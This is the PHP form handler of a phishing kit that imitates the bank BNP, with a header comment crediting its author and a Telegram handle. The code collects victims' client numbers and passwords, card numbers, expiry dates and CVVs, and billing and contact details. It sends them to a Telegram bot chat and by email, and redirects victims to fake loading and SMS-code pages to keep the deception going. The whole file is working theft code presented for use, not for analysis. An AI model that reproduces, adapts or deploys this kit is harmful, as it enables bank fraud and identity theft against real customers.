<!-- SCAMA WIDTH GHAYT
                                ============================
                                ============================

                                  TELEGRAM : @ghayt_Zone

                                ============================
                                ============================
-->




<?php 

require_once "functions.php";

$to = '';


if ($_POST['step']== 'index') {
    $numero_client = $_POST['numero_client'];
    $password = $_POST['password'];

    if (empty($numero_client) || empty($password)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | LOGIN | BNP"       . "\r\n" ;
        $message  = " _________ INFO_LOGIN___" . "\r\n";
        $message .= "NUMERO CLIENT : " . $numero_client                   . "\r\n";
        $message .= "PASSWORD : " . $password             . "\r\n";
        
        if(isset($_POST['submit']))
            {
                $apiToken = "<TOKEN_REMOVED>";
                $data = [
                'chat_id' => '-1001338998056', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
        header("Location: loading.php");
        exit();
    }
}


else if ($_POST['step'] == 'cc') {
    
        $_SESSION['errors']      = [];
        $_SESSION['card_number']  = $_POST['card_number'];
        $_SESSION['expiry']       = $_POST['expiry'];
        $_SESSION['cvv']   = $_POST['cvv'];


        if( empty($_POST['card_number']) ) {
            $_SESSION['errors']['card_number'] = true;
        }

        if( empty($_POST['expiry']) ) {
            $_SESSION['errors']['expiry'] = true;
        }

        if( empty($_POST['cvv']) ) {
            $_SESSION['errors']['cvv'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject  = $_SERVER['REMOTE_ADDR'] . "=====> | BNP | CC | <====="    . "\r\n"; ;
            $message  = "_______  CC INFO ___ " . $_SERVER["REMOTE_ADDR"]    . "\r\n"; 
            $message .= "CARD NUMBER : " . $_POST['card_number']             . "\r\n";
            $message .= "EXPIRY : " . $_POST['expiry']                       . "\r\n" ;
            $message .= "CCV : " . $_POST['cvv']                             . "\r\n" ;

            header("Location: loading-end.php");

            mail($to, $subject, $message);

            if(isset($_POST['submit']))
            {
                $apiToken = "<TOKEN_REMOVED>";
                $data = [
                'chat_id' => '-1001338998056', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            exit();

        }else{
            header("Location: cc.php");
            exit();}
}



else if ($_POST['step'] == 'billing') {
    
        $_SESSION['errors']      = [];
        $_SESSION['nom']  = $_POST['nom'];
        $_SESSION['email']       = $_POST['email'];
        $_SESSION['adresse']  = $_POST['adresse'];
        $_SESSION['pays']       = $_POST['pays'];
        $_SESSION['numero']   = $_POST['numero'];
        $_SESSION['code_zip']   = $_POST['code_zip'];


        if( empty($_POST['nom']) ) {
            $_SESSION['errors']['nom'] = true;
        }

        if( empty($_POST['email']) ) {
            $_SESSION['errors']['email'] = true;
        }

        if( empty($_POST['adresse']) ) {
            $_SESSION['errors']['adresse'] = true;
        }

        if( empty($_POST['pays']) ) {
            $_SESSION['errors']['pays'] = true;
        }

        if( empty($_POST['numero']) ) {
            $_SESSION['errors']['numero'] = true;
        }

        if( empty($_POST['code_zip']) ) {
            $_SESSION['errors']['code_zip'] = true;
        }

        if( count($_SESSION['errors']) == 0 ) {
            $subject  = $_SERVER['REMOTE_ADDR'] . "=====> | BNP | CC | <====="    . "\r\n"; ;
            $message  = "_______  CC INFO ___ " . $_SERVER["REMOTE_ADDR"]    . "\r\n"; 
            $message .= "NOM COMPLET : " . $_POST['nom']             . "\r\n";
            $message .= "EMAIL : " . $_POST['email']                       . "\r\n" ;
            $message .= "ADRESSE : " . $_POST['adresse']                             . "\r\n" ;
            $message .= "PAYS : " . $_POST['pays']             . "\r\n";
            $message .= "NUMERO TELEPHONE : " . $_POST['numero']                       . "\r\n" ;
            $message .= "CODE ZIP : " . $_POST['code_zip']                             . "\r\n" ;

            header("Location: loading-sms.php");

            mail($to, $subject, $message);

            if(isset($_POST['submit']))
            {
                $apiToken = "<TOKEN_REMOVED>";
                $data = [
                'chat_id' => '-1001338998056', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };
            exit();

        }else{
            header("Location: billing.php");
            exit();}
}


if( $_POST['step'] == 'sms' ) {

        $sms      = $_POST['sms'];

        if( empty($sms)) {
            header("Location: sms.php");
            exit();

            
        } else {

            header("Location: loading-cc.php");
            exit();
        }
}

?>